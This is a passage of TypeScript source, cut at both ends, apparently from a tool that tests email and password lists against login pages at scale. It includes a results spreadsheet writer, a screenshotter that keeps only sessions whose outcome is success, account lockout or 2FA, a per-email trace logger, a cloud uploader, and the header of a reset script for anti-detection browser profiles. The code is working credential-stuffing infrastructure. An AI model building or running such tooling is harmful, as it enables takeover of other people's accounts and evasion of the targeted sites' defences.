 * Debounced to avoid hammering the disk on rapid updates.
 */
export function updateCredentialXlsx(
  credentials: { email: string; passwords: string[] }[],
  rows: any[]
): void {
  if (!_xlsxPath) return;

  const data: CredentialXlsxRow[] = credentials.map((c, i) => {
    const row = rows[i];
    return {
      email: c.email,
      passwords: c.passwords,
      passwordResults: row?._passwordResults || [],
      overallOutcome: getOverallOutcome(row),
      sites: row?.sites || {},
      currentBatch: row?.currentBatch || 0,
    };
  });

  _pendingData = data;

  if (_writeTimeout) clearTimeout(_writeTimeout);
  _writeTimeout = setTimeout(async () => {
    if (!_pendingData) return;
    try {
      await writeXlsx(_pendingData, _xlsxPath, _csvPath);
      _pendingData = null;
    } catch (err: unknown) {
      log.error(`Error: ${err instanceof Error ? err.message : String(err)}`);
    }
  }, DEBOUNCE_MS);
}

/**
 * Force an immediate write (e.g., on engine stop).
 */
export async function flushCredentialXlsx(
  credentials: { email: string; passwords: string[] }[],
  rows: any[]
): Promise<void> {
  if (!_xlsxPath) return;
  if (_writeTimeout) { clearTimeout(_writeTimeout); _writeTimeout = null; }

  const data: CredentialXlsxRow[] = credentials.map((c, i) => {
    const row = rows[i];
    return {
      email: c.email,
      passwords: c.passwords,
      passwordResults: row?._passwordResults || [],
      overallOutcome: getOverallOutcome(row),
      sites: row?.sites || {},
      currentBatch: row?.currentBatch || 0,
    };
  });

  try {
    await writeXlsx(data, _xlsxPath, _csvPath);
    log.info(`Final flush written to ${_xlsxPath}`);
  } catch (err: unknown) {
    log.error(`Flush error: ${err instanceof Error ? err.message : String(err)}`);
  }
}

/**
 * Record a specific password attempt result for granular cell coloring.
 */
export function recordPasswordResult(
  row: any,
  passwordIndex: number,
  outcome: string,
  site: string
): void {
  if (!row) return;
  if (!row._passwordResults) row._passwordResults = [];
  // Update or add
  const existing = row._passwordResults.find(
    (r: PasswordResult) => r.attemptIndex === passwordIndex && r.site === site
  );
  if (existing) {
    existing.outcome = outcome;
    existing.timestamp = new Date().toISOString();
  } else {
    row._passwordResults.push({
      password: "",
      outcome,
      site,
      timestamp: new Date().toISOString(),
      attemptIndex: passwordIndex,
    });
  }
}

function getOverallOutcome(row: any): string {
  if (!row || !row.sites) return "queued";
  const outcomes = Object.values(row.sites).map((s: any) => s.outcome);
  if (outcomes.includes("success")) return "success";
  if (outcomes.includes("2FA")) return "2FA";
  if (outcomes.includes("testing")) return "testing";
  if (outcomes.includes("tempdisabled")) return "tempdisabled";
  if (outcomes.includes("permdisabled")) return "permdisabled";
  if (outcomes.includes("blocked")) return "blocked";
  if (outcomes.includes("noaccount")) return "noaccount";
  if (outcomes.some((o: any) => o === "N/A" || o === "failed")) return "incorrect";
  return "queued";
}

/* eslint-disable @typescript-eslint/no-explicit-any, @typescript-eslint/no-unsafe-assignment, @typescript-eslint/no-unsafe-member-access, @typescript-eslint/no-unsafe-call, @typescript-eslint/no-unsafe-argument, @typescript-eslint/no-unsafe-return, @typescript-eslint/no-unused-expressions, @typescript-eslint/no-unused-vars, @typescript-eslint/require-await */
/**
 * flow-screenshotter.ts
 *
 * Captures a step-by-step screenshot filmstrip of the login flow.
 * Each named flow step produces a WebP screenshot and metadata entry,
 * creating a visual audit trail that both humans and AI can review
 * to understand exactly what happened during each credential test.
 *
 * Storage layout:
 *   screenshots/flow-steps/{sessionId}/
 *     01-navigate-to-site.webp
 *     02-cookie-dismissed.webp
 *     ...
 *     flow-manifest.json
 *
 * Retention: configurable via MAX_SESSIONS (default 100).
 * Older session directories are pruned on startup.
 */

import fs from "node:fs";
import path from "node:path";
import type { Page } from "playwright-core";
import { createLogger } from "../core/logger.js";

const log = createLogger("FlowScreenshotter");

// ── Types ──────────────────────────────────────────────────────────────────

export interface FlowStepCapture {
  stepIndex: number;
  stepName: string;
  normalizedName: string;
  timestamp: string;
  imagePath: string;
  pageUrl: string;
  durationMs: number;
  error?: string;
}

export interface FlowManifest {
  sessionId: string;
  email: string;
  site: string;
  backend: string;
  startedAt: string;
  completedAt?: string;
  outcome?: string;
  steps: FlowStepCapture[];
}

// ── Constants ──────────────────────────────────────────────────────────────

const FLOW_STEPS_DIR = path.join(process.cwd(), "screenshots", "flow-steps");
const MAX_SESSIONS = 100;
const SCREENSHOT_QUALITY = 65; // WebP quality — small but readable

// ── Helpers ────────────────────────────────────────────────────────────────

function normalizeName(stepName: string): string {
  return stepName
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, "-")
    .replace(/^-|-$/g, "")
    .substring(0, 60);
}

function ensureDir(dir: string): void {
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }
}

// ── FlowScreenshotter ─────────────────────────────────────────────────────

export class FlowScreenshotter {
  private sessionDir: string = "";
  private manifest: FlowManifest | null = null;
  private stepCounter = 0;
  private enabled = false;

  /**
   * Begin a new flow-step capture session.
   * Call this once per credential test, before the first flow step.
   */
  start(sessionId: string, email: string, site: string, backend: string): void {
    this.enabled = true;
    this.stepCounter = 0;
    this.sessionDir = path.join(FLOW_STEPS_DIR, sessionId);
    ensureDir(this.sessionDir);

    this.manifest = {
      sessionId,
      email,
      site,
      backend,
      startedAt: new Date().toISOString(),
      steps: [],
    };

    log.info(`Flow screenshot session started: ${sessionId} (${site}/${email})`);
  }

  /**
   * Capture a screenshot for the current flow step.
   * Non-blocking — failures are logged but never thrown.
   */
  async capture(page: Page, stepName: string): Promise<FlowStepCapture | null> {
    if (!this.enabled || !this.manifest) return null;

    const t0 = Date.now();
    this.stepCounter++;
    const idx = this.stepCounter;
    const normalized = normalizeName(stepName);
    const filename = `${String(idx).padStart(2, "0")}-${normalized}.webp`;
    const filePath = path.join(this.sessionDir, filename);

    let pageUrl = "";
    try {
      pageUrl = page.url();
    } catch { /* page may be closed */ }

    const entry: FlowStepCapture = {
      stepIndex: idx,
      stepName,
      normalizedName: normalized,
      timestamp: new Date().toISOString(),
      imagePath: filename,
      pageUrl,
      durationMs: 0,
    };

    try {
      if (page.isClosed()) {
        entry.error = "page_closed";
        entry.durationMs = Date.now() - t0;
        this.manifest.steps.push(entry);
        return entry;
      }

      const buffer = await page.screenshot({
        type: "png",
        fullPage: false,
        timeout: 3000,
      });

      // Convert to WebP for smaller file size using sharp if available,
      // otherwise save as PNG
      try {
        const sharp = (await import("sharp")).default;
        const webpBuffer = await sharp(buffer)
          .webp({ quality: SCREENSHOT_QUALITY })
          .toBuffer();
        fs.writeFileSync(filePath, webpBuffer);
      } catch {
        // sharp unavailable — save as PNG with renamed extension
        const pngPath = filePath.replace(/\.webp$/, ".png");
        fs.writeFileSync(pngPath, buffer);
        entry.imagePath = filename.replace(/\.webp$/, ".png");
      }

      entry.durationMs = Date.now() - t0;
      this.manifest.steps.push(entry);

      log.debug(`Step ${idx}: ${stepName} → ${entry.imagePath} (${entry.durationMs}ms)`);
      return entry;
    } catch (e: unknown) {
      entry.error = (e instanceof Error ? e.message : String(e)) || String(e);
      entry.durationMs = Date.now() - t0;
      this.manifest.steps.push(entry);
      log.debug(`Step ${idx}: ${stepName} — screenshot failed: ${entry.error}`);
      return entry;
    }
  }

  /**
   * Outcomes worth keeping — everything else is deleted on finalize.
   * Only success, temp/perm disabled, and 2FA are diagnostically interesting.
   */
  private static readonly RETAIN_OUTCOMES = new Set([
    "success", "tempdisabled", "permdisabled", "2FA",
  ]);

  /**
   * Finalize the session: write the manifest and optionally set the outcome.
   * Sessions with uninteresting outcomes are deleted to save disk space.
   */
  finalize(outcome?: string): FlowManifest | null {
    if (!this.enabled || !this.manifest) return null;

    this.manifest.completedAt = new Date().toISOString();
    if (outcome) this.manifest.outcome = outcome;

    const shouldRetain = outcome ? FlowScreenshotter.RETAIN_OUTCOMES.has(outcome) : false;

    if (shouldRetain) {
      try {
        const manifestPath = path.join(this.sessionDir, "flow-manifest.json");
        fs.writeFileSync(manifestPath, JSON.stringify(this.manifest, null, 2));
        log.info(`Flow manifest written: ${this.manifest.steps.length} steps, outcome=${outcome} → ${manifestPath}`);
      } catch (e: unknown) {
        log.warn(`Failed to write flow manifest: ${e instanceof Error ? e.message : String(e)}`);
      }
    } else {
      // Non-interesting outcome — delete the entire session directory
      try {
        if (this.sessionDir && fs.existsSync(this.sessionDir)) {
          fs.rmSync(this.sessionDir, { recursive: true, force: true });
          log.debug(`Deleted uninteresting flow session (outcome=${outcome})`);
        }
      } catch { /* best-effort cleanup */ }
    }

    const result = this.manifest;
    this.manifest = null;
    this.enabled = false;
    this.stepCounter = 0;
    return result;
  }

  /**
   * Check if flow screenshots are currently active.
   */
  get isActive(): boolean {
    return this.enabled && this.manifest !== null;
  }

  /**
   * Get the current step count.
   */
  get currentStep(): number {
    return this.stepCounter;
  }

  /**
   * Prune old flow-step session directories beyond MAX_SESSIONS.
   * Called once on startup to prevent unbounded growth.
   */
  static pruneOldSessions(maxSessions: number = MAX_SESSIONS): number {
    try {
      ensureDir(FLOW_STEPS_DIR);
      const dirs = fs.readdirSync(FLOW_STEPS_DIR, { withFileTypes: true })
        .filter(d => d.isDirectory())
        .map(d => ({
          name: d.name,
          path: path.join(FLOW_STEPS_DIR, d.name),
          mtime: fs.statSync(path.join(FLOW_STEPS_DIR, d.name)).mtimeMs,
        }))
        .sort((a, b) => b.mtime - a.mtime); // newest first

      if (dirs.length <= maxSessions) return 0;

      const toDelete = dirs.slice(maxSessions);
      let deleted = 0;
      for (const dir of toDelete) {
        try {
          fs.rmSync(dir.path, { recursive: true, force: true });
          deleted++;
        } catch { /* best-effort */ }
      }

      if (deleted > 0) {
        log.info(`Pruned ${deleted} old flow-step session(s)`);
      }
      return deleted;
    } catch (e: unknown) {
      log.warn(`Failed to prune flow-step sessions: ${e instanceof Error ? e.message : String(e)}`);
      return 0;
    }
  }

  /**
   * Get a list of all available flow-step sessions with their manifests.
   */
  static listSessions(): Array<{ sessionId: string; manifest: FlowManifest | null }> {
    try {
      ensureDir(FLOW_STEPS_DIR);
      const dirs = fs.readdirSync(FLOW_STEPS_DIR, { withFileTypes: true })
        .filter(d => d.isDirectory())
        .sort((a, b) => {
          const aTime = fs.statSync(path.join(FLOW_STEPS_DIR, a.name)).mtimeMs;
          const bTime = fs.statSync(path.join(FLOW_STEPS_DIR, b.name)).mtimeMs;
          return bTime - aTime; // newest first
        });

      return dirs.map(d => {
        const manifestPath = path.join(FLOW_STEPS_DIR, d.name, "flow-manifest.json");
        let manifest: FlowManifest | null = null;
        try {
          if (fs.existsSync(manifestPath)) {
            manifest = JSON.parse(fs.readFileSync(manifestPath, "utf-8"));
          }
        } catch { /* corrupt manifest */ }
        return { sessionId: d.name, manifest };
      });
    } catch {
      return [];
    }
  }
}

/* eslint-disable @typescript-eslint/no-explicit-any, @typescript-eslint/no-unsafe-assignment, @typescript-eslint/no-unsafe-member-access, @typescript-eslint/no-unsafe-call, @typescript-eslint/no-unsafe-argument, @typescript-eslint/no-unsafe-return, @typescript-eslint/no-unused-expressions, @typescript-eslint/no-unused-vars, @typescript-eslint/require-await */
import fs from 'fs';
import path from 'path';
import { createLogger } from '../core/logger.js';

const log = createLogger('flow-tracer');

export interface FlowTraceEvent {
  timestamp: string;
  type: "step_start" | "step_end" | "step_error" | "network" | "mutation" | "outcome" | "info";
  session_id: string;
  email: string;
  site: string;
  message: string;
  details?: any;
}

class FlowTracer {
  private outputDir: string;
  private enabled: boolean;
  private currentStreams: Map<string, fs.WriteStream> = new Map();

  constructor() {
    // Flow tracing is enabled globally by default to aid AI debugging
    this.enabled = true;
    this.outputDir = path.join(process.cwd(), 'hermes', 'reports', 'flow-traces');

    if (!fs.existsSync(this.outputDir)) {
      fs.mkdirSync(this.outputDir, { recursive: true });
    }
  }

  private getStream(email: string): fs.WriteStream {
    const safeEmail = email.replace(/[^a-z0-9@.-]/gi, '_');

    if (!this.currentStreams.has(safeEmail)) {
      const filePath = path.join(this.outputDir, `${safeEmail}.jsonl`);
      // Append mode so we can keep a running log of the credential across runs
      const stream = fs.createWriteStream(filePath, { flags: 'a' });
      stream.on("error", (err) => {
        log.warn(`Flow trace stream error for ${safeEmail}: ${err}`);
        this.currentStreams.delete(safeEmail);
      });
      this.currentStreams.set(safeEmail, stream);
    }

    return this.currentStreams.get(safeEmail)!;
  }

  public recordEvent(event: Omit<FlowTraceEvent, "timestamp">) {
    if (!this.enabled) return;

    try {
      const fullEvent: FlowTraceEvent = {
        timestamp: new Date().toISOString(),
        ...event
      };

      const stream = this.getStream(event.email);
      stream.write(JSON.stringify(fullEvent) + '\n');
    } catch (e) {
      log.warn(`Failed to write flow trace event: ${String(e)}`);
    }
  }

  public flush(email: string) {
    const safeEmail = email.replace(/[^a-z0-9@.-]/gi, '_');
    const stream = this.currentStreams.get(safeEmail);
    if (stream) {
      stream.end();
      this.currentStreams.delete(safeEmail);
    }
  }
}

export const flowTracer = new FlowTracer();

/* eslint-disable @typescript-eslint/no-explicit-any, @typescript-eslint/no-unsafe-assignment, @typescript-eslint/no-unsafe-member-access, @typescript-eslint/no-unsafe-call, @typescript-eslint/no-unsafe-argument, @typescript-eslint/no-unsafe-return, @typescript-eslint/no-unused-expressions, @typescript-eslint/no-unused-vars, @typescript-eslint/require-await */
/**
 * gcs-uploader.ts — Google Cloud Storage screenshot upload service.
 *
 * Architecture:
 *   1. Screenshots are written locally first (screenshot-service.ts)
 *   2. After local write + dashboard emit, this service uploads to GCS async
 *   3. The GCS public URL is emitted back so the dashboard can use it
 *
 * Config via environment variables:
 *   GCS_BUCKET        — bucket name (required)
 *   GCS_ACCESS_KEY    — HMAC Interoperability access key
 *   GCS_SECRET_KEY    — HMAC Interoperability secret key
 *   GCS_PATH_PREFIX   — prefix for all uploads (default: "screenshots/")
 *   GCS_ENABLED       — set to "false" to disable (default: "true" if bucket is set)
 */

import { S3Client, PutObjectCommand, DeleteObjectCommand, HeadObjectCommand } from "@aws-sdk/client-s3";
import fs from "fs";
import path from "path";
import { EventEmitter } from "events";

/** AWS SDK error shape — not exported from @aws-sdk/client-s3 */
interface AwsSdkError extends Error {
  $metadata?: { httpStatusCode?: number };
  code?: string;
  name: string;
}

export interface GcsUploaderOpts {
  bucket: string;
  accessKeyId?: string;
  secretAccessKey?: string;
  projectId?: string;
  pathPrefix?: string;
  maxConcurrent?: number;
  retries?: number;
  logger?: (level: string, msg: string) => void;
}

export interface GcsUploadResult {
  localPath: string;
  gcsPath: string;
  publicUrl: string;
  sizeBytes: number;
  email?: string;
  label?: string;
  target?: string;
}

export class GcsUploader extends EventEmitter {
  private s3: S3Client;
  private bucket: string;
  private pathPrefix: string;
  private maxConcurrent: number;
  private retries: number;
  private log: (level: string, msg: string) => void;
  private inFlight = 0;
  private queue: Array<{
    localPath: string;
    remoteName: string;
    contentType: string;
    meta?: Record<string, string>;
    resolve: (r: GcsUploadResult) => void;
    reject: (e: Error) => void;
  }> = [];
  private _ready = false;
  private _disabled = false;

  private _offlineUntil = 0;
  private static readonly DEFAULT_OFFLINE_COOLDOWN_MS = 5 * 60_000;
  private _offlineCooldownMs = GcsUploader.DEFAULT_OFFLINE_COOLDOWN_MS;

  private static readonly NETWORK_ERROR_CODES = new Set<string>([
    "ENOTFOUND", "ETIMEDOUT", "ECONNREFUSED", "EAI_AGAIN", "EHOSTUNREACH", "ENETUNREACH",
  ]);

  private _isNetworkError(e: any): boolean {
    if (!e) return false;
    if (typeof e.code === "string" && GcsUploader.NETWORK_ERROR_CODES.has(e.code)) return true;
    const msg: string = e.message || "";
    return /ENOTFOUND|ETIMEDOUT|ECONNREFUSED|EAI_AGAIN|getaddrinfo|ENETUNREACH|EHOSTUNREACH/i.test(msg);
  }

  get isOffline(): boolean {
    if (this._offlineUntil === 0) return false;
    if (Date.now() >= this._offlineUntil) {
      this._offlineUntil = 0;
      this.log("INFO", "GCS network cooldown elapsed — re-probing on next upload");
      return false;
    }
    return true;
  }

  private _shouldDefer(): boolean {
    if (!this.isOffline) return false;
    if (this._offlineUntil === 0 || this._offlineUntil - Date.now() < this._offlineCooldownMs) {
      this._offlineUntil = this._offlineUntil || Date.now() + this._offlineCooldownMs;
      this.log("WARN", `GCS offline (cooldown ${Math.round(this._offlineCooldownMs / 1000)}s) — uploads deferred`);
    }
    return true;
  }

  private _markOffline(e: any): void {
    const wasOffline = this._offlineUntil > Date.now();
    this._offlineUntil = Date.now() + this._offlineCooldownMs;
    this.log("WARN", `GCS network unreachable (${e?.code || "?"}): ${e?.message || "unknown"}. Entering offline mode for ${Math.round(this._offlineCooldownMs / 1000)}s.`);
    if (!wasOffline) {
      this.emit("offline", { error: e?.message || "unknown", code: e?.code, cooldownMs: this._offlineCooldownMs });
    }
  }

  setOfflineCooldown(ms: number): void {
    this._offlineCooldownMs = Math.max(1000, ms);
  }

  constructor(opts: GcsUploaderOpts) {
    super();
    this.pathPrefix = opts.pathPrefix ?? "screenshots/";
    this.maxConcurrent = opts.maxConcurrent ?? 4;
    this.retries = opts.retries ?? 3;
    this.bucket = opts.bucket;
    this.log = opts.logger ?? ((level, msg) => console.log(`[GCS ${level}] ${msg}`));

    try {
      if (!opts.accessKeyId || !opts.secretAccessKey) {
        throw new Error("Missing GCS accessKeyId or secretAccessKey for interoperability API");
      }

      this.s3 = new S3Client({
        endpoint: "https://storage.googleapis.com",
        region: "auto",
        credentials: {
          accessKeyId: opts.accessKeyId,
          secretAccessKey: opts.secretAccessKey,
        },
        // GCS S3-interop does NOT support chunked transfer encoding.
        // AWS SDK v3 defaults to chunked for streams, which causes
        // "Invalid argument" 400 errors. We handle this by always
        // sending Buffer bodies with explicit ContentLength instead.
      });
      this._ready = true;
      this.log("INFO", `GCS S3-uploader ready → gs://${opts.bucket}/${this.pathPrefix}`);
    } catch (e: unknown) {
      this.log("ERR", `GCS uploader init failed: ${e instanceof Error ? e.message : String(e)}`);
      this._disabled = true;
      this.s3 = null as any;
    }
  }

  get isReady(): boolean { return this._ready && !this._disabled; }

  async upload(localPath: string, meta?: {
    email?: string; label?: string; target?: string;
  }): Promise<GcsUploadResult | null> {
    if (!this.isReady) return null;
    if (this._shouldDefer()) return null;
    if (!fs.existsSync(localPath)) {
      this.log("WARN", `File not found for upload: ${localPath}`);
      return null;
    }

    const filename = path.basename(localPath);
    const ext = path.extname(filename).toLowerCase();
    const contentType = ext === ".png" ? "image/png" : 
                        ext === ".jpg" || ext === ".jpeg" ? "image/jpeg" : 
                        ext === ".webm" ? "video/webm" :
                        ext === ".mp4" ? "video/mp4" :
                        "application/octet-stream";
    const remoteName = `${this.pathPrefix}${filename}`;

    return new Promise((resolve, reject) => {
      this.queue.push({ localPath, remoteName, contentType, meta: meta, resolve, reject });
      this._drain();
    });
  }

  async uploadBuffer(buf: Buffer, filename: string, meta?: {
    email?: string; label?: string; target?: string;
  }): Promise<GcsUploadResult | null> {
    if (!this.isReady) return null;
    if (this._shouldDefer()) return null;

    const ext = path.extname(filename).toLowerCase();
    const contentType = ext === ".png" ? "image/png" : 
                        ext === ".jpg" || ext === ".jpeg" ? "image/jpeg" : 
                        ext === ".webm" ? "video/webm" :
                        ext === ".mp4" ? "video/mp4" :
                        "application/octet-stream";
    const remoteName = `${this.pathPrefix}${filename}`;

    try {
      await this._retryUploadBuffer(remoteName, buf, contentType, meta);

      const publicUrl = `https://storage.googleapis.com/${this.bucket}/${remoteName}`;
      const result: GcsUploadResult = {
        localPath: "",
        gcsPath: `gs://${this.bucket}/${remoteName}`,
        publicUrl,
        sizeBytes: buf.length,
        email: meta?.email,
        label: meta?.label,
        target: meta?.target,
      };
      this.emit("uploaded", result);
      return result;
    } catch (e: unknown) {
      this.log("ERR", `GCS buffer upload failed for ${filename}: ${e instanceof Error ? e.message : String(e)}`);
      return null;
    }
  }

  async deleteByFilename(filename: string): Promise<boolean> {
    if (!this.isReady) return false;
    const remoteName = `${this.pathPrefix}${filename}`;
    try {
      await this.s3.send(new DeleteObjectCommand({
        Bucket: this.bucket,
        Key: remoteName,
      }));
      this.log("INFO", `Deleted from GCS: ${remoteName}`);
      return true;
    } catch (_e: unknown) {
      const e = _e as AwsSdkError;
      if (e.$metadata?.httpStatusCode !== 404) {
        this.log("WARN", `GCS delete failed for ${remoteName}: ${e instanceof Error ? e.message : String(e)}`);
      }
      return false;
    }
  }

  private _drain(): void {
    while (this.inFlight < this.maxConcurrent && this.queue.length > 0) {
      const item = this.queue.shift()!;
      this.inFlight++;
      this._doUpload(item.localPath, item.remoteName, item.contentType, item.meta)
        .then(item.resolve)
        .catch(item.reject)
        .finally(() => {
          this.inFlight--;
          this._drain();
        });
    }
  }

  private async _doUpload(
    localPath: string,
    remoteName: string,
    contentType: string,
    meta?: Record<string, string>,
  ): Promise<GcsUploadResult> {
    const stats = fs.statSync(localPath);

    for (let attempt = 1; attempt <= this.retries; attempt++) {
      try {
        // GCS S3-interop requires Content-Length (rejects chunked encoding).
        // Read entire file into a Buffer instead of streaming.
        const fileBuffer = fs.readFileSync(localPath);
        
        await this.s3.send(new PutObjectCommand({
          Bucket: this.bucket,
          Key: remoteName,
          Body: fileBuffer,
          ContentType: contentType,
          ContentLength: fileBuffer.length,
          Metadata: meta || {},
          CacheControl: "public, max-age=31536000",
        }));

        const publicUrl = `https://storage.googleapis.com/${this.bucket}/${remoteName}`;
        const result: GcsUploadResult = {
          localPath,
          gcsPath: `gs://${this.bucket}/${remoteName}`,
          publicUrl,
          sizeBytes: stats.size,
          email: meta?.email,
          label: meta?.label,
          target: meta?.target,
        };

        this.log("INFO", `Uploaded ${path.basename(localPath)} → ${publicUrl} (${(stats.size / 1024).toFixed(1)}KB)`);
        this.emit("uploaded", result);

        try {
          fs.unlinkSync(localPath);
          this.log("INFO", `Deleted local copy to save space: ${path.basename(localPath)}`);
        } catch (delErr: unknown) {
          this.log("WARN", `Failed to delete local copy ${path.basename(localPath)}: ${delErr instanceof Error ? delErr.message : String(delErr)}`);
        }

        return result;
      } catch (_e: unknown) {
        const e = _e as AwsSdkError;
        if (e.$metadata?.httpStatusCode === 403 || e.$metadata?.httpStatusCode === 401) {
          this._disabled = true;
          this.log("ERR", `GCS disabled due to auth/billing error: ${e instanceof Error ? e.message : String(e)}`);
          throw e;
        }
        if (this._isNetworkError(e)) {
          this._markOffline(e);
          this.emit("upload-failed", { localPath, remoteName, error: (e instanceof Error ? e.message : String(e)), network: true });
          throw e;
        }
        if (attempt < this.retries) {
          const delay = Math.min(1000 * Math.pow(2, attempt - 1), 8000);
          this.log("WARN", `Upload attempt ${attempt}/${this.retries} failed: ${e instanceof Error ? e.message : String(e)} — retrying in ${delay}ms`);
          await new Promise(r => setTimeout(r, delay));
        } else {
          this.log("ERR", `Upload failed after ${this.retries} attempts: ${localPath} → ${e instanceof Error ? e.message : String(e)}`);
          this.emit("upload-failed", { localPath, remoteName, error: (e instanceof Error ? e.message : String(e)) });
          throw e;
        }
      }
    }
    throw new Error("Unreachable");
  }

  private async _retryUploadBuffer(remoteName: string, buf: Buffer, contentType: string, meta?: Record<string, string>): Promise<void> {
    for (let attempt = 1; attempt <= this.retries; attempt++) {
      try {
        await this.s3.send(new PutObjectCommand({
          Bucket: this.bucket,
          Key: remoteName,
          Body: buf,
          ContentType: contentType,
          ContentLength: buf.length,
          Metadata: meta || {},
          CacheControl: "public, max-age=31536000",
        }));
        return;
      } catch (_e: unknown) {
        const e = _e as AwsSdkError;
        if (e.$metadata?.httpStatusCode === 403 || e.$metadata?.httpStatusCode === 401) {
          this._disabled = true;
          this.log("ERR", `GCS disabled due to auth/billing error: ${e instanceof Error ? e.message : String(e)}`);
          throw e;
        }
        if (this._isNetworkError(e)) {
          this._markOffline(e);
          throw e;
        }
        if (attempt < this.retries) {
          await new Promise(r => setTimeout(r, 1000 * Math.pow(2, attempt - 1)));
        } else {
          throw e;
        }
      }
    }
  }

  async uploadFileIfExists(localPath: string, remotePrefix: string = ""): Promise<boolean> {
    if (!this.isReady || !fs.existsSync(localPath)) return false;
    if (this._shouldDefer()) return false;
    const filename = path.basename(localPath);
    const remoteName = `${remotePrefix}${filename}`;
    
    try {
      await this.s3.send(new HeadObjectCommand({ Bucket: this.bucket, Key: remoteName }));
      // If it exists, we let it be, unless it's a CSV or DB
      if (filename === "results.csv" || filename.endsWith(".db")) {
        await this.s3.send(new DeleteObjectCommand({ Bucket: this.bucket, Key: remoteName }));
      } else {
        return true; // Already exists
      }
    } catch (e: unknown) {
      if ((e instanceof Error ? e.name : undefined) !== 'NotFound') {
        // Ignored
      }
    }

    try {
      const contentType = filename.endsWith(".csv") ? "text/csv" : filename.endsWith(".db") ? "application/vnd.sqlite3" : "application/octet-stream";
      // GCS S3-interop: use Buffer, not stream
      const fileBuffer = fs.readFileSync(localPath);
      await this.s3.send(new PutObjectCommand({
        Bucket: this.bucket,
        Key: remoteName,
        Body: fileBuffer,
        ContentType: contentType,
        ContentLength: fileBuffer.length,
      }));
      this.log("INFO", `Synced file to cloud: gs://${this.bucket}/${remoteName}`);
      return true;
    } catch (e: unknown) {
      this.log("WARN", `Failed to sync ${localPath}: ${e instanceof Error ? e.message : String(e)}`);
      return false;
    }
  }

  async backfillFromDisk(dir: string, extensions: string[] = [".jpg", ".jpeg", ".png"]): Promise<number> {
    if (!this.isReady) return 0;
    if (!fs.existsSync(dir)) return 0;

    const files = fs.readdirSync(dir).filter(f => extensions.some(ext => f.toLowerCase().endsWith(ext)));
    this.log("INFO", `Backfill: checking ${files.length} local files in ${path.basename(dir)}...`);

    let uploaded = 0;
    let skipped = 0;

    for (const file of files) {
      const remoteName = `${this.pathPrefix}${file}`;
      try {
        await this.s3.send(new HeadObjectCommand({ Bucket: this.bucket, Key: remoteName }));
        // Exists
        skipped++;
        try { fs.unlinkSync(path.join(dir, file)); } catch { /* intentional */ }
        continue;
      } catch (e: unknown) {
        if ((e instanceof Error ? e.name : undefined) !== 'NotFound') {
           // Skip if other error
        }
      }

      try {
        await this.upload(path.join(dir, file));
        uploaded++;
      } catch {
        // Logged
      }
    }

    this.log("INFO", `Backfill complete for ${path.basename(dir)}: ${uploaded} uploaded, ${skipped} already in GCS`);
    return uploaded;
  }

  async ensureBucket(_location = "US"): Promise<void> {
    if (!this._ready) return;
    // Validate bucket accessibility using HeadBucket (correct S3 API).
    // The old HeadObject probe was giving false positives — a 404 for
    // "bucket not found" was being misread as "key not found, bucket OK".
    try {
      const { HeadBucketCommand } = await import("@aws-sdk/client-s3");
      await this.s3.send(new HeadBucketCommand({ Bucket: this.bucket }));
      this.log("INFO", `Bucket gs://${this.bucket} verified accessible via HMAC`);
    } catch (_e: unknown) {
      const e = _e as AwsSdkError;
      const httpCode = e.$metadata?.httpStatusCode;
      if (httpCode === 404) {
        this.log("ERR", `Bucket gs://${this.bucket} does NOT exist (404). Disabling GCS uploads.`);
        this._disabled = true;
      } else if (httpCode === 403 || httpCode === 401) {
        this.log("ERR", `HMAC credentials rejected by GCS (${httpCode}). Disabling GCS uploads.`);
        this._disabled = true;
      } else if ((e instanceof Error ? e.message : String(e))?.includes("Invalid argument")) {
        this.log("ERR", `GCS HMAC keys are invalid or expired: ${e instanceof Error ? e.message : String(e)}. Disabling GCS uploads.`);
        this._disabled = true;
      } else {
        this.log("WARN", `Could not verify bucket gs://${this.bucket}: ${e instanceof Error ? e.message : String(e)} (HTTP ${httpCode}). Will retry on next upload.`);
      }
    }
  }

  async shutdown(): Promise<void> {
    const start = Date.now();
    while (this.inFlight > 0 && Date.now() - start < 10000) {
      await new Promise(r => setTimeout(r, 200));
    }
    if (this.inFlight > 0) {
      this.log("WARN", `Shutdown with ${this.inFlight} uploads still in-flight`);
    }
  }
}

// ─── Factory ────────────────────────────────────────────────────────────────

export function createGcsUploaderFromEnv(
  logger?: (level: string, msg: string) => void,
): GcsUploader | null {
  const bucket = process.env.GCS_BUCKET;
  if (!bucket) {
    (logger ?? console.log)("INFO", "GCS_BUCKET not set — cloud screenshot upload disabled");
    return null;
  }

  const enabled = (process.env.GCS_ENABLED ?? "true").toLowerCase();
  if (enabled === "false" || enabled === "0") {
    (logger ?? console.log)("INFO", "GCS_ENABLED=false — cloud screenshot upload disabled");
    return null;
  }

  const accessKeyId = process.env.GCS_ACCESS_KEY;
  const secretAccessKey = process.env.GCS_SECRET_KEY;

  if (!accessKeyId || !secretAccessKey) {
    (logger ?? console.log)("WARN", "GCS_ACCESS_KEY or GCS_SECRET_KEY not set — using local-only mode");
    return null;
  }

  return new GcsUploader({
    bucket,
    accessKeyId,
    secretAccessKey,
    projectId: process.env.GCS_PROJECT_ID,
    pathPrefix: process.env.GCS_PATH_PREFIX ?? "screenshots/",
    logger,
  });
}

/* eslint-disable @typescript-eslint/no-explicit-any, @typescript-eslint/no-unsafe-assignment, @typescript-eslint/no-unsafe-member-access, @typescript-eslint/no-unsafe-call, @typescript-eslint/no-unsafe-argument, @typescript-eslint/no-unsafe-return, @typescript-eslint/no-unused-expressions, @typescript-eslint/no-unused-vars, @typescript-eslint/require-await */
/**
 * Hard-reset CLI — wipes local browser state and burn bookkeeping so the
 * next run starts from a clean slate.
 *
 * What it removes:
 *   • Every cloak profile directory under $CLOAK_PROFILE_DIR (and the default
 *     $TMPDIR/cloak-profiles fallback), including persistent and isolated
 *     per-session subdirectories.
 *   • The pre-warmed static cache directory ($CLOAK_STATIC_CACHE_DIR, default
 *     .cloak-static-cache) — both Joe and Ignition pre-warmed assets live in
 *     a single shared cache root, so wiping it drops both at once.
 *
 * What it touches (mutates, not deletes):
 *   • progress.json — every per-site row that ended in an N/A outcome whose
 *     error matches an UPDATE YOUR PIN / PIN UPDATE / LOGIN VERIFICATION
 *     misdirection (or a "requeued:" marker) is reverted to
 *     {outcome: "queued", attempts: 0, error: removed}. The top-level
 *     row.status is also reset to "queued" if no other site on the row
 *     remains in a terminal state.
 *
 * Idempotent: missing paths and absent rows are silently skipped.
